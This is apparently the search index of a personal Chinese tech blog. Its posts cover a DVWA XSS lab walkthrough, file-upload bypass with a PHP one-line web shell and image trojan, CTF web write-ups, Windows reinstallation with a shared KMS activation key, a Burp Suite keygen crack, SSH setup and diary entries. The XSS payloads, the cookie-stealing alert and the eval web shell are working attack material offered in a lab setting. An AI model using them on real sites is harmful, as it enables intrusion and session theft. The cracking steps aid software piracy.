<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DVWA]]></title>
    <url>%2F2018%2F04%2F19%2Fxss%2F</url>
    <content type="text"><![CDATA[前期准备：linux下搭建dvwa需要lamp环境，其php版本不能太高，php7.0无法使用，php5.6可以; XSS定义CSS(Cross Site Script)又叫XSS,中文意思：跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行。XSS的攻击目标是为了盗取客户端的cookie或者其他网站用于识别客户端身份的敏感信息。获取到合法用户的信息后，攻击者甚至可以假冒最终用户与网站进行交互。 XSS的原理也就是往HTML中注入脚本，HTML指定了脚本标记.在没有过滤字符的情况下，只需要保持完整无错的脚本标记即可触发XSS，假如我们在某个资料表单提交内容,表单提交内容就是某个标记属性所赋的值，我们可以构造如下值来闭和标记来构造完整无错的脚本标记，&quot;&gt;&lt;script&gt;alert(&#39;Xss&#39;);&lt;/script&gt;&lt;&quot; 反射型XSS等级Low源代码12345678910&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 这里随便输入Word试一下：word&lt;script&gt;alert(&#39;Xss&#39;);&lt;/script&gt; ;观察到调用函数输出了Xss弹窗,后面为Word,其实”注入语句“可以完成许多功能。 等级Medium源代码：12345678910111213&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 观察发现使用str_replace进行了黑名单过滤，绕过这个不成问题，使用 双写绕过&lt;scri&lt;script&gt;pt&gt;alert(/test/);&lt;/script&gt; 大小写混写绕过&lt;sCripT&gt;alert(/test/);&lt;/script&gt; 等级High1234567891011&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 使用正则进行匹配，过滤了大小写混合写入已经双写，但是可以使用img、body等标签的事件以及iframe标签的src注入恶意的js代码进行漏洞利用&lt;img src=1 onerror=alert(&#39;test&#39;)&gt; 等级Impossible源代码:12345678910111213&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。以防止浏览器将其作为HTML元素。这样会将用户输入的内容都不作为标签以提高安全性。预定义的字符是： &amp; （和号）成为 &amp;amp; &quot; （双引号）成为 &amp;quot; &apos; （单引号）成为 &apos; &lt; （小于）成为 &amp;lt; &gt; （大于）成为 &amp;gt; 一些常用的xss语句12345678&lt;script&gt;alert(/test/)&lt;/script&gt; 最普通的xss代码&lt;script&gt;alert(document.cookie);&lt;/script&gt; 获取cookie&lt;img src=&quot;javascript:alert(/test/)&quot;&gt; img链接地址xss&lt;script src=&quot;test.js&quot;&gt; &lt;script&gt; 外部调用攻击代码ls.js&lt;script alert(&apos;test)&lt;/SCRIPT&gt; 注释方法防止过滤&lt;img src=&quot;&quot; onerror=alert(&quot;xss&quot;)&gt; 加载图像失败执行&lt;iframe onload=alert(&apos;test&apos;)&gt; 框架&lt;script&gt;location=&apos;test.com&apos;;&lt;/script&gt; 跳转某页面 存储型XSS等级Low源代码:123456789101112131415161718192021&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitize name input $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 部分函数讲解trim() 函数移除字符串两侧的空白字符或其他预定义字符。相关函数： ltrim() - 移除字符串左侧的空白字符或其他预定义字符 rtrim() - 移除字符串右侧的空白字符或其他预定义字符 stripslashes()：删除由 addslashes() 函数添加的反斜杠。该函数用于清理从数据库或 HTML 表单中取回的数据。(若是连续二个反斜杠，则去掉一个，保留一个；若只有一个反斜杠，就直接去掉。)；mysqli_real_escape_string：转义字符串中的特殊字符； name栏输入发现有字数限制，那就抓包改数据；message栏正常输入即可，&lt;script&gt;alert(&#39;test&#39;);&lt;/script&gt; 等级Medium源代码：1234567891011121314151617181920212223&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 部分函数讲解函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用``标签。1234567891011121314151617181920212223242526272829303132```addslashes()``` 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。其对message参数使用了`htmlspecialchars`函数进行编码，因此无法对message参数注入XSS代码，但是对于name参数，简单过滤了`&lt;script&gt;`字符串，仍然存在存储型的XSS。使用双写`&lt;scri&lt;script&gt;pt&gt;alert(&apos;test&apos;)`![改包](https://upload-images.jianshu.io/upload_images/9464729-3a7307e13813a512.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)成功弹框![medium](https://upload-images.jianshu.io/upload_images/9464729-619ffba35aee9ede.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)大小写混合绕过`&lt;sCrIpt&gt;alert(&apos;test&apos;)`##### 等级High源代码：```php&lt;?phpif( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123; // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close();&#125;?&gt; 这里使用正则表达式过滤了标签，但是依然存在img、iframe等其它危险的标签，因此name参数仍然有存储型XSS抓包改name数据=&lt;img src=1 onerror=alert(&#39;test&#39;)&gt;成功弹框 等级Impossible源代码：1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这个就比较高级了，对name和message均进行了htmlspecialchars过滤 存储型和反射型的区别 存储型存储型XSS，持久型，代码是存储在服务器中的，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。 反射型反射型XSS，非持久化，需要欺骗用户手动去点击链接才能触发XSS代码，一般容易出现在搜索页面。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win resystem]]></title>
    <url>%2F2018%2F04%2F19%2Fsystem%2F</url>
    <content type="text"><![CDATA[首先要有一个U盘启动盘或者装机光盘； 一、安装12- ```Launch CSm```关闭- ```Security Boot```选择```Disable修改完成后按F10保存并退出接下来就该修改磁盘格式为GPT格式了，进入安装界面时按住1- 首先输入```diskpart 进入磁盘操作界面disk```1- 查看磁盘名及类型```select disk 0 清除磁盘格式1- 安装``win10``需要格式化为gpt格式```convert gpt 格式化完成后进行分区paraition ```123456789- 创建```EFI```分区，执行```create partition efi size=200```（分区大小为200MB）- 创建``MSR``分区，执行```create partition msr size=200```（微软系统保留分区）- 创建主分区，执行```create partition primary size=xxx```（具体大小根据你的要求而定，作为系统分区来说，如果有足够空间，可以留出大于100GB即102400MB的空间，命令为```create partition primary size=102400```，方便系统有足够周转空间）- 如果还有剩余空间，可继续重复执行上述命令来创建新的分区（注意修改具体数值）。但建议用户创建完系统分区后就退出命令提示符继续安装系统，毕竟这种方式不容易估算剩下的硬盘空间大小，进入安装程序后可以进一步划分剩余空间，也可以在安装结束后，进入系统磁盘管理中进行分配- 企业版win10激活方法，鼠标右击```win```键，点击```Windows Powershell（管理员）```，依次输入一下命令，如若序列号不可使用，请百度最新win10企业版序列号替换即可，也可以使用Windows激活工具进行激活```slmgr.vbs /upkslmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43slmgr /skms zh.us.toslmgr /ato 二、安装Win7听说现在新版电脑不再支持安装Win7了，当然如果你的电脑支持安装Win7，最好不过了。按1- 修改```Lanuch CMS```为```Enable Boot```选择```Disable```123修改完成后按F10保存并退出接下来就该修改磁盘格式了，进入安装界面时按住```Shift+F10```，进入命令行，- 首先输入```diskpart 进入磁盘操作界面disk```1- 查看磁盘名及类型```select disk 0 清除磁盘格式1- 安装``win7``需要格式化为MBR格式```convert mbr 操作完成后输入exit退出到选择安装系统到哪个磁盘时再进行分区，这是Win7与Win10的不同，分多内存看自己电脑磁盘空间大小，C盘建议分100GB即可，此时电脑会自动分出100MB内存给系统默认分区，选择系统盘时选择自己刚刚创建的100GB的分区就可以，其它剩余的内存安装好系统后进去磁盘管理再分区会更加方便。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali]]></title>
    <url>%2F2018%2F04%2F11%2Fkali%2F</url>
    <content type="text"><![CDATA[kali2018-1安装官网下载:https://www.kali.org/downloads/出处http://www.weixianmanbu.com/article/2336.html Vmtools问题成功安装Vmtools后仍然无法使用文件复制粘贴，就放弃了Vmtools，改用open-vmtools一行命令即可apt-get install open-vm-tools-desktop fuse然后reboot mysql任意密码登录问题mysql -u root，进入mysql，输入12GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;youpassword&apos; WITH GRANT OPTION; #youpassword你的新密码flush privileges; #刷新一下]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2018%2F04%2F09%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[上传文件校验 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定 php文件上传过程黑名单、白名单认证此文可以参考https://blog.csdn.net/hitwangpeng/article/details/47060671黑名单绕过可以测试，如1.aaa，1.php3,1.php4等进行测试 文件上传漏洞Burpsuite改包 0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 上传文件为1.php，在burpsuite将其改为1.php+，发送到repeate，+号的十六进制为2d，在hex里面将其改为00，截断，点GO 上传文件为1.php.jpg，将jpg前面的.的十六进制（2e）改为00 上传一句话木马，1.php；&lt;?php eval($_POST[&quot;xxx&quot;]);?&gt;，在Burpsuite里面将其文件名改为1.jpg，还有将content-type字段改为image/jpg； 图片木马 Windows下制作图片一句话木马php写入图片copy 1.jpg/b+2.php/a New.jpg Linux下cat 1.jpg 2.php &gt; new.jpg点击上传，http://localhost/upload/upload.html上传成功后，使用文件包含程序，将jpg文件进行解析http://localhost/upload/1.php?page=./uploads/h.jpg?paragam(参数)=图片的绝对路径此时上传成功，php程序一句被即解析，本页面只会显示图片的源码，而不显示php程序，此时查看源代码php程序已经被注释接下来可以使用菜刀连接&nbsp;刚刚的网址，密码是php程序里面写入的参数1.php 12345678&lt;?php if(isset($_GET[&quot;page&quot;]))&#123; include $_GET[&quot;page&quot;]; &#125;else&#123; include &apos;2.php&apos;; &#125;?&gt; 2.php123&lt;?php echo &quot;niaho&quot;;?&gt; ###文件包含漏洞详解，转自https://blog.csdn.net/chence19871/article/details/51906523web安全文件包含漏洞，转自https://blog.csdn.net/hitwangpeng/article/details/45952625绕过姿势https://thief.one/2017/04/10/2/https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Php安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh远程连接Linux]]></title>
    <url>%2F2018%2F04%2F07%2F%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Linux%2F</url>
    <content type="text"><![CDATA[首先,确定是否有安装SSH服务命令：ps -e | grep ssh*如果没有任何显示,则没有安装该服务其次,安装SSH-serversudo apt-get install openssh-server接着,更重要的是安装SSH-clientsudo apt-get install openssh-client确认安装SSH服务成功与否ps -e | grep ssh*如果,看到sshd表明ssh-server启动了; 服务器端设置ssh免密首先Linux要配置好ssh免密连接cd /root/.ssh/如果没有此文件，可以先使用ssh localhost之后便可以进入.ssh文件ls查看只有这一个文件,known_hosts先在本机生成公钥和私钥, ssh-keygen -t rsa将公钥写入认证里面,cat ./id_rsa.pub &gt;&gt; ./authorized_keys修改文件authorized_keys权限为600,chmod 600 .ssh/authorized_keys至此，ssh免密已经配置好了，上述步骤如下 使用Xshell免密远程连接linux转自https://www.linuxidc.com/Linux/2015-03/114947.htm补充网址里面的第六步：复制生成的公钥到linux可以直接将本地id_rsa_2048.pub直接复制过去,将其放入/root/.ssh/文件夹下，使用此命令写入认证cat ./id_rsa_2048.pub &gt;&gt; ./authorized_keys此时再按照上面的网址操作即可 使用cmder免密连接linux先在本机生成公钥和私钥, ssh-keygen -t rsa将生成的id_rsa.pub重命名为id_rsa0.pub(因为linux下一句有一个与此同名的文件),上传至服务器;window下生成的id_rsa.pub存放于C:\Users\用户名\.ssh下将其放入/root/.ssh/文件夹下;使用此命令写入认证cat ./id_rsa0.pub &gt;&gt; ./authorized_keys此时Cmder连接linux已经免密了 PS：使用ssh连接，关闭linux系统防火墙才可连接，关闭防火墙命令service iptables stop]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Destiny]]></title>
    <url>%2F2018%2F04%2F05%2FDestiny%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;成功正因我志在成功！成功呈概率分布，关键是你能不能坚持到成功开始呈现的那一刻。&nbsp;&nbsp;人生的路上，我们都在奔跑，我们总在赶超一些人，也总在被一些人超越。人生的要义，一是欣赏沿途的风景，二是抵达遥远的终点。人生的秘诀，就在于寻找一种最适合自己的速度，莫因疾进而不堪重荷，莫因迟缓而空耗生命。人生的快乐，就是走自己的路，看自己的景。]]></content>
      <categories>
        <category>Daily</category>
      </categories>
      <tags>
        <tag>Daily</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burpsuite抓取收据数据包]]></title>
    <url>%2F2018%2F04%2F05%2FBurpsuite%E6%8A%93%E5%8F%96%E6%94%B6%E6%8D%AE%E6%95%B0%E6%8D%AE%E5%8C%85%2F</url>
    <content type="text"><![CDATA[首先给手机导入crt证书，电脑证书为der格式，直接修改后缀为crt格式即可，此链接已经改好了网盘下载:https://pan.baidu.com/s/1JmdjJ1VO40Vjv0a2OkGVNw &nbsp;密码：6bs8电脑和手机要处于同一个网络，手机WIFI设置好代理及端口，使用Burpsuite进行抓包分析，使用手机访问想要抓取的网站或App里面某一功能，Burpsuite的history里面有记录，可进行分析Burpsuite使用教程,此处需要知道重放包的使用以及history即可此处举例：坦白说&nbsp;&nbsp;QQ新出的坦白说功能，抓取到的页面Host应为ti.qq.com，抓取到的数据为加密类型，解密网址]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web]]></title>
    <url>%2F2018%2F04%2F05%2FCTF-Web%2F</url>
    <content type="text"><![CDATA[1、md5 collision，传送参数，函数如下：123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo "nctf&#123;*****************&#125;";&#125; else &#123; echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 这个题目如果知道MD5碰撞的概念，同时知道了在PHP中的MD5中的0e的比较，这道题目就十分的简单。如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。例子如下，其他符合/0[eE]\d{30}/的MD5值： 原码 md5 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s532378020a 0e220463095855511507588041205815 240610708 0e462097431906509019562988736854 2、层层递进查看源代码，最下面发现有子网站，直到最后找到404.html,发现注释里面存在flag3、JSAAencode代码报错，未定义的字符，修改一下，在控制台里面运行一下即可，关于控制台指南4、单身二十年使用Burpsuite抓包，发history里面藏着一个search_key.php，查看response，出现flag5、Are you from google?修改referer为 https://www.google.com提供一个http头部字段详解6、php decode123456789&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?&gt; eval函数详解上述代码最后一行eval改为echo放入本地运行即可]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web-writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Burpsuite1.7.31]]></title>
    <url>%2F2018%2F04%2F05%2F%E5%AE%89%E8%A3%85Burpsuite1-7-31%2F</url>
    <content type="text"><![CDATA[起码要有一个Burpsuite的安装包，下载链接 密码：zgcxzip里面有两个文件首先打开burp-loader-keygen.jar，点击右上角的Run接着会出现将图三红色框内的License序列号复制到图二里面，点击右下角的Next，进入图五，点击Manual activation点击图五里面的Copy request，进入图一，粘贴到此处粘贴完后，出现红色框内的序列号，复制到图五的Paste response里面，点击Next，至此安装已经完成以后每次使用时双击burp-loader-keygen.jar，点击右上角的Run即可]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Daily-One]]></title>
    <url>%2F2018%2F04%2F05%2FDaily-One%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此刻经历的这一幕，父亲站在路边等着我去接外孙的回来，从他身旁过的时候，看到他满脸洋溢着微笑，我也挺开心的，而此刻我脑海里却浮现着将来的某一天，等自己孩子回来的时候，父母已经老啦，但他们同样会这样做，那一刻或许我会更加有感触。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;生在农村，长在农村，我们的童年无忧无虑，充满幻想，充满生机，小时候渴望去长大，如今真正成年之后，那个无忧无虑的年代再也不复回。有的是生活中的压力，学习上的奋斗。越长大，越孤单。曾给自己定下计划，却不能坚持到底，高中时那种奋斗劲渐渐消去；不要给自己找太多借口，我们可以放松自己但不是放纵。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;写此文仅此作为回忆，以后多发些技术型文章]]></content>
      <categories>
        <category>Daily</category>
      </categories>
      <tags>
        <tag>Daily</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo]]></title>
    <url>%2F2018%2F04%2F02%2Fhexo%2F</url>
    <content type="text"><![CDATA[hexo next主题配置本站采用Misc风格，主题背景默认的，不过颜色可以自己设置，新建一个tags标签，hexo new page tags，此时会在本地创建一个tags文件夹,想让侧栏出现tags和分类，只需将这个弄好就OK了 添加本地搜索安装hexo-generator-searchdbnpm install hexo-generator-searchdb --save 修改站点配置文件12345search: path: search.xml field: post format: html limit: 10000 修改主题配置文件123# Local searchlocal_search: enable: true 接入网易云音乐进入网易云音乐官网，搜索想要的歌曲，生成外链接，复制此代码到/hexo/themes/next/layout/_macro/sidebar.swig，复制到112行 每次修改完成后先 heco clean,再hexo generate(hexo g) 插入一句Markdownpad使用，使用时修改选项为commonMark;]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F03%2F28%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
